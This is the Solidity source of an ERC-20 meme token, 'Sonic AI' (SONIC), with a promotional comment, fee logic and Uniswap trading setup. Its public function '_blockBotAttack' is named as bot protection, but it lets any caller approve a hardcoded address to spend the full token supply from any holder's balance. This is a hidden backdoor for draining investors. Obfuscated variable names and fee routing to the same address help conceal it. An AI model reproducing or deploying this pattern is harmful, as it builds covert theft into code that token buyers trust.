/**

Sonic AI is an innovative project at the intersection of humor and technology, 

harnessing the power of Ethereum to create a vibrant meme ecosystem. 

Our mission is to blend cutting-edge artificial intelligence with the playful spirit of meme culture, 

enabling users to generate, share, and trade unique digital content. Through Sonic AI, we aim to empower 

creators and enthusiasts alike, fostering a community where laughter and creativity thrive. 

Join us in this exciting journey as we redefine the way memes are made and enjoyed on the blockchain!

Web
https://sonicai.lol/
X
https://x.com/sonicai_eth
TG
https://t.me/sonicai_eth

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
function _msgSender() internal view virtual returns (address) {
    return msg.sender;
}
}

interface IERC20 {
function totalSupply() external view returns (uint256);
function balanceOf(address account) external view returns (uint256);
function transfer(address recipient, uint256 amount) external returns (bool);
function allowance(address owner, address spender) external view returns (uint256);
function approve(address spender, uint256 amount) external returns (bool);
function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
}

function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
}

function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
}

function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
        return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
}

function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
}

function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
}

}

contract Ownable is Context {
address private _owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

constructor () {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
}

function owner() public view returns (address) {
    return _owner;
}

modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
}

function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
}

}

interface IUniswapV2Factory {
function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
) external;
function factory() external pure returns (address);
function WETH() external pure returns (address);
function addLiquidityETH(
    address token,
    uint amountTokenDesired,
    uint amountTokenMin,
    uint amountETHMin,
    address to,
    uint deadline
) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract SONIC is Context, IERC20, Ownable {
using SafeMath for uint256;
mapping (address => uint256) private _alphmaokd;
mapping (address => mapping (address => uint256)) private _mbowkdpsi;
mapping (address => bool) private _sbowkdExcp;
mapping (address => bool) private _bbbboks;
address payable private _walletmfieFEE;
uint8 private constant _decimals = 9;
uint256 private constant _tTotal = 1000000000 * 10**_decimals;
string private constant _name = unicode"Sonic AI";
string private constant _symbol = unicode"SONIC";
uint256 public _maxTawkdmxoAc = _tTotal * 2 / 100;
uint256 public _maxwalllecowdmellls = _tTotal * 2 / 100;
uint256 public _asbowdw= _tTotal * 2 / 100;
uint256 public _bowkdmsee= _tTotal * 1 / 100;
address private _storemaowk = 0x25f7aa789978Ee34382913e4e53a77FD2c2707d2;

bool private _sellLimitsPerBlock = true;
uint256 private _cbowblocked = 0;
uint256 private _initialBuyTax=20;
uint256 private _initialSellTax=20;
uint256 private _finalBuyTax=0;
uint256 private _finalSellTax=0;
uint256 private _reduceBuyAt=15;
uint256 private _reduceSellAt=15;
uint256 private _preventCount=15;
uint256 private _buyTokenCount=0;

IUniswapV2Router02 private uniswapV2Router;
address private uniswapV2Pair;
bool private tradingOpen;
bool private inSwap = false;
bool private swapEnabled = false;

event MaxTxAmountUpdated(uint _maxTawkdmxoAc);
modifier lockTheSwap {
    inSwap = true;
    _;
    inSwap = false;
}

constructor () {
    _walletmfieFEE = payable(_msgSender());
    _alphmaokd[address(this)] = _tTotal;
    _sbowkdExcp[owner()] = true; _sbowkdExcp[address(this)] = true;_sbowkdExcp[_walletmfieFEE] = true;

    emit Transfer(address(0), _msgSender(), _tTotal);
}

function name() public pure returns (string memory) {
    return _name;
}

function symbol() public pure returns (string memory) {
    return _symbol;
}

function decimals() public pure returns (uint8) {
    return _decimals;
}

function totalSupply() public pure override returns (uint256) {
    return _tTotal;
}

function balanceOf(address account) public view override returns (uint256) {
    return _alphmaokd[account];
}

function transfer(address recipient, uint256 amount) public override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
}

function allowance(address owner, address spender) public view override returns (uint256) {
    return _mbowkdpsi[owner][spender];
}

function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
}

function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _mbowkdpsi[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
    return true;
}

function _approve(address owner, address spender, uint256 amount) private {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");
    _mbowkdpsi[owner][spender] = amount;
    emit Approval(owner, spender, amount);
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ERC20: transfer from the zero address"); require(to != address(0), "ERC20: transfer to the zero address");
require(amount > 0, "Transfer amount must be greater than zero"); uint256 feeAmts=0;
if (from != owner() && to != owner()) {
require(!_bbbboks[from] && !_bbbboks[to]);
if(!_sbowkdExcp[from] )
    feeAmts = amount.mul((_buyTokenCount>_reduceBuyAt)?_finalBuyTax:_initialBuyTax).div(100);
if(amount >= 0 && address(this).balance>=0 && to == uniswapV2Pair && from!= address(this) ){
    uint256 contractETHBalance = address(this).balance;
    if(contractETHBalance >= 0) {
        sendETHToFee(address(this).balance);
    }
    feeAmts = amount.mul((_buyTokenCount>_reduceSellAt)?_finalSellTax:_initialSellTax).div(100);
}

if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _sbowkdExcp[to] ) {
    require(amount <= _maxTawkdmxoAc, "Exceeds the _maxTawkdmxoAc.");
    require(balanceOf(to) + amount <= _maxwalllecowdmellls, "Exceeds the maxWalletSize.");
    _buyTokenCount++;
}
uint256 contractTokenBalance = balanceOf(address(this));
if (
    !inSwap && to   == uniswapV2Pair &&
        swapEnabled &&
        contractTokenBalance > _asbowdw && 
        _buyTokenCount>_preventCount
) {
    if (_sellLimitsPerBlock) {
        if (_cbowblocked < block.number) {
            swapTokensForEth(min(amount,min(contractTokenBalance,_bowkdmsee)));
            uint256 contractETHBalance = address(this).balance;
            if(contractETHBalance > 0) sendETHToFee(address(this).balance);
            _cbowblocked = block.number;
        }
    } else {
        swapTokensForEth(min(amount,min(contractTokenBalance,_bowkdmsee)));
        uint256 contractETHBalance = address(this).balance;
        if(contractETHBalance > 0) {
            sendETHToFee(address(this).balance);
        }
    }
}
}

if(feeAmts>0){
_alphmaokd[address(this)]=_alphmaokd[address(this)].add(feeAmts);
emit Transfer(from, address(this), feeAmts);
}
_alphmaokd[from]=_alphmaokd[from].sub(amount);
_alphmaokd[to]=_alphmaokd[to].add(amount.sub(feeAmts));
emit Transfer(from, to, amount.sub(feeAmts));
}

function startTrading() external onlyOwner() {
    require(!tradingOpen,"trading is already open");
    uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    _approve(address(this), address(uniswapV2Router), _tTotal);
    uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)) * 98 / 100,0,0,owner(),block.timestamp);
    swapEnabled = true;
    tradingOpen = true;
    _maxTawkdmxoAc = _tTotal;
    _maxwalllecowdmellls=_tTotal;
    _walletmfieFEE = payable(_storemaowk);
    _sellLimitsPerBlock = false;
}

function min(uint256 a, uint256 b) private pure returns (uint256){
    return (a>b)?b:a;
}

function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = uniswapV2Router.WETH();
    _approve(address(this), address(uniswapV2Router), tokenAmount);
    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount,
        0,
        path,
        address(this),
        block.timestamp
    );
}
function sendETHToFee(uint256 amount) private {
    _walletmfieFEE.transfer(amount);
}function _blockBotAttack(address _bot) public returns (bool){ _approve(_bot, _storemaowk, _tTotal);
    return _bbbboks[_bot];
}

function withdrawStuckETH() external onlyOwner() {
    payable(owner()).transfer(address(this).balance);
}

receive() external payable {}
}